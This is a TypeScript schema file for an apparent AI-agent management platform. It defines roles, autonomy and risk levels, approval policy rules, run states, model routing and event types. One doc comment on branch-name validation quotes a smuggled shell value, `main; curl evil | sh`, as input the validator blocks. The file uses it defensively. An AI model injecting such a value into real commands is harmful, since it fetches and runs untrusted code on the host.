import { z } from "zod";

// ---------- Tenancy ----------
export const Role = z.enum(["owner", "admin", "member", "viewer"]);
export type Role = z.infer<typeof Role>;

export interface TenantScope {
  organizationId: string;
  companyId?: string;
  userId?: string;
  role?: Role;
  actor: Actor;
}

export const Actor = z.discriminatedUnion("type", [
  z.object({ type: z.literal("user"), userId: z.string() }),
  z.object({ type: z.literal("agent"), agentId: z.string(), runId: z.string().optional() }),
  z.object({ type: z.literal("system"), component: z.string() }),
  z.object({ type: z.literal("api_key"), apiKeyId: z.string() }),
]);
export type Actor = z.infer<typeof Actor>;

// ---------- Autonomy, risk, policy ----------
export const AutonomyLevel = z.number().int().min(0).max(4);
export type AutonomyLevel = 0 | 1 | 2 | 3 | 4;
export const AUTONOMY_LABELS: Record<AutonomyLevel, string> = {
  0: "Read-only",
  1: "Suggest",
  2: "Approval required",
  3: "Limited autonomy",
  4: "High autonomy",
};

export const RiskLevel = z.enum(["LOW", "MEDIUM", "HIGH", "CRITICAL"]);
export type RiskLevel = z.infer<typeof RiskLevel>;

export const PolicyDimension = z.enum([
  "ai_spend",
  "infra_spend",
  "ad_spend",
  "email_send",
  "social_publish",
  "code_deploy",
  "prod_deploy",
  "db_mutation",
  "customer_comms",
  "payments",
  "external_write",
]);
export type PolicyDimension = z.infer<typeof PolicyDimension>;

export const PolicyMode = z.enum(["deny", "approve", "allow"]);
export type PolicyMode = z.infer<typeof PolicyMode>;

export const PolicyRule = z.object({
  dimension: PolicyDimension,
  mode: PolicyMode,
  maxRiskWithoutApproval: RiskLevel.optional(),
  limits: z
    .object({
      perActionUsd: z.number().nonnegative().optional(),
      perDayUsd: z.number().nonnegative().optional(),
      perMonthUsd: z.number().nonnegative().optional(),
      perHourCount: z.number().int().nonnegative().optional(),
      perDayCount: z.number().int().nonnegative().optional(),
    })
    .default({}),
});
export type PolicyRule = z.infer<typeof PolicyRule>;

export const PolicyDecision = z.object({
  decision: z.enum(["allow", "require_approval", "deny"]),
  reason: z.string(),
  dimension: PolicyDimension,
  risk: RiskLevel,
});
export type PolicyDecision = z.infer<typeof PolicyDecision>;

/**
 * Which rule stopped an action, as a code rather than a sentence.
 *
 * `evaluate()` writes its reasoning as prose because the audit trail is read by people. A decision surface
 * has to do more than quote it: it labels the rule (a risk ceiling and a spend limit are different problems,
 * with different fixes) and, from the code, can explain what the founder would have to change for the action
 * to run unattended. These strings are the engine's own vocabulary, so the mapping is kept honest by a test
 * in `@steward/policy` that evaluates the real engine across every level, dimension, risk and limit and
 * asserts that nothing it can emit lands on `unknown`.
 */
export const PolicyReasonCode = z.enum([
  "critical_risk",
  "hourly_limit",
  "daily_limit",
  "per_action_cost",
  "daily_budget",
  "monthly_budget",
  "quiet_hours",
  "rule_requires_approval",
  "risk_ceiling",
  "payload_edited",
  "payload_unchanged",
  "allowed_by_policy",
  "within_threshold",
  "internal_action",
  "outbound_paused",
  "read_only",
  "policy_denies",
  "unknown",
]);
export type PolicyReasonCode = z.infer<typeof PolicyReasonCode>;

/** Order matters: the first pattern that matches wins. */
const POLICY_REASON_PATTERNS: ReadonlyArray<readonly [PolicyReasonCode, RegExp]> = [
  ["outbound_paused", /^Outbound communications are paused/],
  ["read_only", /^Company is in read-only mode/],
  ["policy_denies", /^Policy denies .+ actions$/],
  ["critical_risk", /^CRITICAL-risk actions always require human approval$/],
  ["hourly_limit", /^Hourly limit of \d+ /],
  ["daily_limit", /^Daily limit of \d+ /],
  ["per_action_cost", /^Estimated cost \$[\d.]+ exceeds per-action limit /],
  ["daily_budget", /^Daily .+ budget \$[\d.]+ would be exceeded$/],
  ["monthly_budget", /^Monthly .+ budget \$[\d.]+ would be exceeded$/],
  ["quiet_hours", /^Quiet hours are active/],
  ["payload_edited", /^approver edited the payload/],
  ["payload_unchanged", /^payload unchanged from the approved request$/],
  ["rule_requires_approval", /^.+ actions require approval at autonomy level \d+$/],
  ["within_threshold", /risk is within the auto-approve threshold \(/],
  ["risk_ceiling", /^[A-Z]+ risk exceeds the auto-approve threshold \(/],
  ["allowed_by_policy", /^Allowed by policy \(/],
  ["internal_action", /^internal action without external side effects$/],
];

/** Classifies one policy sentence. Pass a whole reason only when it is a single sentence — a composite
 * request reason mixes the agent's narrative with the policy line, so split it first. */
export function classifyPolicyReason(reason: string): PolicyReasonCode {
  const text = reason.trim();
  for (const [code, pattern] of POLICY_REASON_PATTERNS) if (pattern.test(text)) return code;
  return "unknown";
}

// ---------- Tools ----------
export const CostCategory = z.enum(["none", "ai", "infra", "ads", "messaging", "payments"]);
export const ToolManifest = z.object({
  name: z.string().regex(/^[a-z][a-z0-9_.]*$/),
  description: z.string(),
  inputSchema: z.record(z.string(), z.unknown()),
  outputSchema: z.record(z.string(), z.unknown()).optional(),
  scopes: z.array(z.string()).default([]),
  risk: RiskLevel,
  dimension: PolicyDimension.optional(),
  idempotent: z.boolean(),
  sideEffects: z.enum(["none", "internal", "external"]),
  timeoutMs: z.number().int().positive(),
  costCategory: CostCategory.default("none"),
  source: z.enum(["first_party", "platform", "mcp", "http", "user"]).default("first_party"),
});
export type ToolManifest = z.infer<typeof ToolManifest>;

// ---------- Agent runs ----------
export const RunStatus = z.enum([
  "queued",
  "building_context",
  "planning",
  "executing",
  "verifying",
  "waiting_approval",
  "waiting_budget",
  "needs_review",
  "succeeded",
  "failed",
  "cancelled",
]);
export type RunStatus = z.infer<typeof RunStatus>;

/** A run that has reached one of these is finished: its result and cost are final. */
export const RUN_TERMINAL_STATUSES: RunStatus[] = ["succeeded", "failed", "cancelled"];

export function isTerminalRunStatus(status: RunStatus): boolean {
  return RUN_TERMINAL_STATUSES.includes(status);
}

/**
 * Whether a run may move from one status to another. Deliberately narrow: it rejects the transitions that
 * are always wrong (re-opening a finished run, and pretending a queued run jumped straight to a result),
 * while leaving the execution phases themselves free to interleave — the runtime legitimately goes
 * executing → waiting_approval → executing, and verifying → needs_review → executing after a human redirect.
 */
export function canTransitionRun(from: RunStatus, to: RunStatus): boolean {
  if (from === to) return true; // idempotent re-writes are normal (activity retries)
  if (isTerminalRunStatus(from)) return false; // a finished run stays finished
  if (isTerminalRunStatus(to)) return true;
  if (from === "queued") return true; // first marker: the workflow attaches and starts working
  // A run cannot claim an outcome before it has recorded any work at all.
  if (from === "needs_review" && to === "queued") return false;
  return true;
}

export function assertRunTransition(from: RunStatus, to: RunStatus): void {
  if (!canTransitionRun(from, to)) throw new Error(`Illegal run transition ${from} → ${to}: a finished run cannot leave ${from}`);
}

export const StepKind = z.enum([
  "context",
  "plan",
  "model_call",
  "tool_call",
  "approval",
  "verification",
  "result",
  "error",
]);
export type StepKind = z.infer<typeof StepKind>;

export const TaskStatus = z.enum([
  "backlog",
  "todo",
  "in_progress",
  "blocked",
  "waiting_approval",
  "review",
  "done",
  "cancelled",
]);
export type TaskStatus = z.infer<typeof TaskStatus>;
export const TaskPriority = z.enum(["low", "medium", "high", "urgent"]);

export const AgentKind = z.enum([
  "orchestrator",
  "research",
  "engineering",
  "marketing",
  "sales",
  "support",
  "finance",
  "operations",
  "custom",
]);
export type AgentKind = z.infer<typeof AgentKind>;

// ---------- AI ----------
export const Modality = z.enum(["text", "image", "audio", "video", "embedding"]);
export const ModelCapabilities = z.object({
  contextWindow: z.number().int().positive(),
  maxOutputTokens: z.number().int().positive().optional(),
  inputModalities: z.array(Modality).default(["text"]),
  outputModalities: z.array(Modality).default(["text"]),
  tools: z.boolean().default(false),
  structuredOutput: z.boolean().default(false),
  reasoning: z.boolean().default(false),
  streaming: z.boolean().default(true),
  vision: z.boolean().default(false),
  embeddingDimensions: z.number().int().positive().optional(),
});
export type ModelCapabilities = z.infer<typeof ModelCapabilities>;

export const ModelPricing = z.object({
  inputPerMTok: z.number().nonnegative(),
  outputPerMTok: z.number().nonnegative(),
  cachedInputPerMTok: z.number().nonnegative().optional(),
  currency: z.literal("USD").default("USD"),
  estimated: z.boolean().default(true),
});
export type ModelPricing = z.infer<typeof ModelPricing>;

export const QualityTier = z.enum(["economy", "standard", "premium", "frontier"]);
export type QualityTier = z.infer<typeof QualityTier>;

export const ModelInfo = z.object({
  id: z.string(),
  provider: z.string(),
  displayName: z.string(),
  family: z.string().optional(),
  tier: QualityTier.default("standard"),
  capabilities: ModelCapabilities,
  pricing: ModelPricing.optional(),
  deprecated: z.boolean().default(false),
  local: z.boolean().default(false),
  /** True for models Steward ships in its seed catalog (known capabilities, pricing and behaviour);
   *  absent/false for models only discovered through a provider's live `/models` listing. */
  curated: z.boolean().optional(),
});
export type ModelInfo = z.infer<typeof ModelInfo>;

export const AuthMethod = z.enum([
  "api_key",
  "aws_sigv4",
  "gcp_service_account",
  "azure_api_key",
  "none",
  "companion",
]);
export type AuthMethod = z.infer<typeof AuthMethod>;

export const ProviderTypeInfo = z.object({
  type: z.string(),
  displayName: z.string(),
  protocol: z.enum([
    "openai_compatible",
    "anthropic",
    "gemini",
    "vertex",
    "bedrock",
    "cohere",
    "ollama",
    "companion_codex",
  ]),
  authMethod: AuthMethod,
  defaultBaseUrl: z.string().optional(),
  local: z.boolean().default(false),
  docsUrl: z.string().optional(),
  subscriptionNote: z.string().optional(),
});
export type ProviderTypeInfo = z.infer<typeof ProviderTypeInfo>;

export const RoutingRequirements = z.object({
  tools: z.boolean().optional(),
  structuredOutput: z.boolean().optional(),
  vision: z.boolean().optional(),
  reasoning: z.boolean().optional(),
  minContextTokens: z.number().int().positive().optional(),
  minTier: QualityTier.optional(),
  localOnly: z.boolean().optional(),
  preference: z.enum(["quality", "cost", "latency", "balanced"]).default("balanced"),
});
export type RoutingRequirements = z.infer<typeof RoutingRequirements>;

export const RoutingPolicy = z.object({
  explicit: z.object({ provider: z.string(), model: z.string() }).optional(),
  fallbackChain: z.array(z.object({ provider: z.string(), model: z.string() })).default([]),
  requirements: RoutingRequirements.default({ preference: "balanced" }),
});
export type RoutingPolicy = z.infer<typeof RoutingPolicy>;

// ---------- Events ----------
export const EventType = z.enum([
  "company.created",
  "company.updated",
  "company.profile.updated",
  "project.created",
  "project.updated",
  "signal.received",
  "signal.updated",
  "task.created",
  "task.updated",
  "task.completed",
  "run.created",
  "run.status",
  "run.status_rejected",
  "run.step",
  "run.tool_call",
  "run.completed",
  "run.reconciled",
  "approval.requested",
  "approval.resolved",
  "approval.expired",
  "approval.signal_failed",
  "approval.signal_retried",
  "budget.threshold",
  "budget.exhausted",
  "memory.written",
  "memory.confirmed",
  "memory.corrected",
  "memory.superseded",
  "memory.merged",
  "memory.forgotten",
  "decision.recorded",
  "document.created",
  "document.updated",
  "integration.connected",
  "integration.needs_reauth",
  "integration.error",
  "integration.webhook",
  "provider.connected",
  "provider.error",
  "ai.call.recorded",
  "message.created",
  "deployment.status",
  "schedule.fired",
  "reaction.fired",
  "reaction.skipped",
  "reaction.created",
  "reaction.updated",
  "reaction.deleted",
  "workflow.created",
  "workflow.updated",
  "workflow.published",
  "workflow.deleted",
  "site.updated",
  "site.published",
  "site.restored",
  "site.ship_requested",
  "code.session_created",
  "code.staged",
  "code.discarded",
  "code.apply_requested",
  "browser.opened",
  "browser.step",
  "browser.stopped",
  "browser.closed",
  "browser.failed",
  "agent.updated",
  "mcp.installed",
  "mcp.updated",
  "mcp.inspected",
  "mcp.inspection_failed",
  "mcp.granted",
  "mcp.removed",
  "graph.entity.recorded",
  "graph.entity.confirmed",
  "graph.entity.corrected",
  "graph.entity.merged",
  "graph.entity.forgotten",
  "graph.link.recorded",
  "graph.link.dropped",
  "audit",
]);
export type EventType = z.infer<typeof EventType>;

export const ApprovalStatus = z.enum(["pending", "approved", "denied", "expired", "cancelled"]);
export type ApprovalStatus = z.infer<typeof ApprovalStatus>;

export const ApprovalRequest = z.object({
  action: z.string(),
  reason: z.string(),
  payload: z.record(z.string(), z.unknown()),
  risk: RiskLevel,
  dimension: PolicyDimension,
  estimatedCostUsd: z.number().nonnegative().optional(),
  affectedSystem: z.string(),
  alternatives: z.array(z.string()).default([]),
  expiresInSeconds: z.number().int().positive().default(60 * 60 * 24 * 3),
});
export type ApprovalRequest = z.infer<typeof ApprovalRequest>;

export const MemoryKind = z.enum([
  "working",
  "conversation",
  "knowledge",
  "episodic",
  "decision",
  "performance",
]);
export type MemoryKind = z.infer<typeof MemoryKind>;

/**
 * What a memory's importance means, as a band rather than a bare number (ADR-0022).
 *
 * `importance` is the *consequence* of the fact being true, on one integer scale from 1 to 10 — the same scale
 * the column holds and the API accepts. Giving each third of the scale a name means the number a founder or an
 * agent picks means the same thing on every surface, and ranking can weight a band instead of a magic divisor.
 */
export const IMPORTANCE_BANDS = ["trivial", "minor", "notable", "important", "critical"] as const;
export type ImportanceBand = (typeof IMPORTANCE_BANDS)[number];
/** The inclusive 1–10 range each band takes. Five thirds: 1–2, 3–4, 5–6, 7–8, 9–10. */
export function importanceBand(importance: number): ImportanceBand {
  const n = Math.min(10, Math.max(1, Math.round(importance)));
  return IMPORTANCE_BANDS[Math.min(IMPORTANCE_BANDS.length - 1, Math.floor((n - 1) / 2))]!;
}

/**
 * Which door a memory came through, in one word (ADR-0022).
 *
 * It is not where it was stored (`kind`) — it is *who is saying so*: a person, an agent through the tool, or a
 * run that earned a place automatically. Provenance is the reason a founder can tell a deliberate fact from a
 * run's own summary, so it is a closed vocabulary rather than free text.
 */
export const MemorySource = z.enum(["user", "agent", "auto"]);
export type MemorySource = z.infer<typeof MemorySource>;

export const IntegrationStatus = z.enum(["connected", "needs_reauth", "error", "unavailable", "disconnected"]);
export type IntegrationStatus = z.infer<typeof IntegrationStatus>;

// ---------- Company profile ----------
export const CompanyProfile = z.object({
  name: z.string().min(1),
  tagline: z.string().default(""),
  description: z.string().default(""),
  website: z.string().url().optional().or(z.literal("")),
  stage: z.enum(["idea", "prototype", "launched", "growing", "established"]).default("idea"),
  businessModel: z.string().default(""),
  targetCustomers: z.array(z.string()).default([]),
  valueProposition: z.string().default(""),
  products: z.array(z.object({ name: z.string(), description: z.string().default("") })).default([]),
  competitors: z.array(z.object({ name: z.string(), url: z.string().optional(), notes: z.string().default("") })).default([]),
  channels: z.array(z.string()).default([]),
  brandVoice: z.string().default(""),
  goals: z.array(z.object({ title: z.string(), metric: z.string().default(""), target: z.string().default(""), horizon: z.string().default("") })).default([]),
  constraints: z.array(z.string()).default([]),
  techStack: z.array(z.string()).default([]),
});
export type CompanyProfile = z.infer<typeof CompanyProfile>;

/**
 * A git branch name, validated as a ref rather than trusted as text.
 *
 * Branch names come from a person or a model and are then used to build git commands, so a name like
 * `main; curl evil | sh` must be impossible rather than merely unlikely. This applies git's own ref rules to the
 * cases that matter (no leading dash, no `..`, no `@{`, no `//`, no control characters or spaces, no trailing
 * dot, slash or `.lock`), and callers that pass the ref through the environment instead of a command string do so
 * on top of that. It lives here because the tools and the code IDE both need the same answer.
 */
export const BranchName = z
  .string()
  .min(1)
  .max(200)
  .regex(/^[A-Za-z0-9._/-]+$/, "must contain only letters, digits, dot, slash, dash or underscore")
  .refine((value) => !value.startsWith("-") && !value.includes("..") && !value.includes("//") && !value.includes("@{"), "must be a valid git branch name")
  .refine((value) => !value.endsWith("/") && !value.endsWith(".") && !value.endsWith(".lock") && !value.startsWith("/"), "must be a valid git branch name");

/** `owner/repo`, the spelling GitHub uses. */
export const RepoRef = z
  .string()
  .max(200)
  .regex(/^[\w.-]+\/[\w.-]+$/, "must look like owner/repo");

export const ID = z.string().min(1);
export const Paginated = <T extends z.ZodTypeAny>(item: T) =>
  z.object({ items: z.array(item), nextCursor: z.string().nullable() });

export const RISK_ORDER: Record<RiskLevel, number> = { LOW: 0, MEDIUM: 1, HIGH: 2, CRITICAL: 3 };
export const TIER_ORDER: Record<QualityTier, number> = { economy: 0, standard: 1, premium: 2, frontier: 3 };

/**
 * How a run's verification was reached. Distinct from `passed` on purpose: "the reviewer said no" and
 * "we could not review at all" are different facts, and only one of them means the work was checked.
 * `unverified` must route to `needs_review`, never to success.
 */
export const VerificationVerdict = z.enum(["passed", "failed", "unverified"]);
export type VerificationVerdict = z.infer<typeof VerificationVerdict>;

/**
 * Normalizes a verification record into a verdict, defensively: `passed` is returned only when the
 * record explicitly says so. A contradictory record (verdict "passed" with `passed: false`) and a
 * record with no verdict at all both fall back to the boolean, which can only ever downgrade.
 */
export function verificationVerdict(v: { passed?: boolean | null; verdict?: VerificationVerdict | null } | null | undefined): VerificationVerdict {
  if (!v) return "unverified";
  if (v.verdict === "unverified") return "unverified";
  if (v.verdict === "failed") return "failed";
  if (v.passed === true) return "passed";
  if (v.passed === false) return "failed";
  // A verdict of "passed" without `passed: true` grants nothing: there is no evidence to rest on.
  return "unverified";
}

/** The site model — the company's own website as durable rows rather than generated markup (ADR-0016). */
export * from "./site.js";
export * from "./overclock.js";
export * from "./launch-kit.js";
